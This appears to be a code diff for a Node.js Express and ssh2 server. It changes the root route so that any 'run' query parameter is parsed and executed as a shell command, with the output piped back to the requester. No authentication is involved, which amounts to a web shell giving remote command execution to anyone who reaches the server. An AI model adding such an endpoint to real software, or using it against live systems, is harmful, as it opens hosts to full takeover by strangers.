@@ -1,9 +1,23 @@
 var express = require('express');
 var app = express();
 var port = process.env.PORT || '3000';
+var sps = require('child_process').spawn;
+var stringArgv = require('string-argv');
 
 app.get('/', function(req, res){
-  res.send('id: ' + req.query.id);
+	//res.send('id: ' + req.query.id);
+	if ( typeof(req.query.run) != undefined ) {
+		cargs = stringArgv.parseArgsStringToArgv(req.query.run);
+		try {
+			proc = sps(cargs[0], cargs.slice(1), {
+				shell: true
+			});
+			proc.stdout.pipe(res)
+			proc.stderr.pipe(res)
+		}catch(err){
+			res.send('error: '+err)
+		}
+	}
 });
 
 app.use(express.static('.'));
@@ -13,13 +27,13 @@ app.listen(port, function() {
 });
 
 var fs = require('fs');
+//var spawn = require('child_process').spawn;
 var crypto = require('crypto');
 var inspect = require('util').inspect;
-var spawn = require('child_process').spawn;
 var buffersEqual = require('buffer-equal-constant-time');
 var ssh2 = require('ssh2');
 var utils = ssh2.utils;
-var stringArgv = require('string-argv');
+//var stringArgv = require('string-argv');
 var isWin = /^win/.test(process.platform);
 
 var pubKey = utils.genPublicKey(utils.parseKey(fs.readFileSync('ssh2/user.pub')));
